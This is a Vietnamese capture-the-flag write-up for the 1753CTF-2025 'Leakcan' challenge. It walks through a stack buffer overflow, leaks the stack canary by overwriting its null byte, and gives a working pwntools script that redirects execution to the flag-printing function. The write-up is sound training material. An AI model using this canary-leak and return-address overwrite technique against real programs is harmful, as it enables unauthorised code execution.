# [1753CTF-2025] Leakcan
<p>Có 3 dòng cần chú ý là 23, 27 và 30. Dòng 23 và 30, đọc tối đa 120 byte đầu vào từ người dùng vào v11 có kích thước 32 byte -> Buffer overflow. Dòng 27, in dữ liệu của v11 ra màn hình.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post11/image.png)

<p>Quan sát bảng Functions, ta có hàm your_goal để in flag ra màn hình -> Cần phải kiểm soát RIP trỏ tới hàm này để đọc flag.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post11/image-1.png)

<p>Đặt breakpoint ngay hàm read đầu tiên, địa chỉ chứa dữ liệu là từ 0x00007fffffffe1a0 và cách giá trị canary 0x58 (88) byte.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post11/image-2.png)

<p>Đi đến hàm write thứ 3, nó sẽ bắt đầu in dữ liệu từ 0x00007fffffffe1a0 -> Nếu ta ghi đè null byte đầu tiên của canary thì có thể leak ra giá trị canary.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post11/image-3.png)

<p>Ta gửi lại 88 kí tự và enter -> Lúc này, null byte của canary đã bị đè bởi byte \n (kí tự xuống dòng). Byte ngay sau canary là 0x01 -> Khi leak canary, ta sẽ không lấy byte cuối cùng (0x01) và chỉ lấy từ vị trí cách byte cuối cùng 7 byte.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post11/image-5.png)

<p>Script exploit:</p>

```
from pwn import *

p = process('./leakcan_chall')
elf = ELF('./leakcan_chall')

payload = b'a' * 88
p.sendlineafter(b'What\'s your name?\n', payload)

data = p.recv()
canary = b'\x00' + data[-8:-1]  
payload = b'a' * 88 + (canary) + b'a' * 8
payload += p64(elf.sym['your_goal'])

p.sendline(payload)
p.interactive()
```

<p>Chạy script và lấy được flag thành công.</p>

![alt text](/thanhlai/post/buffer_overflow/image/post11/image-4.png)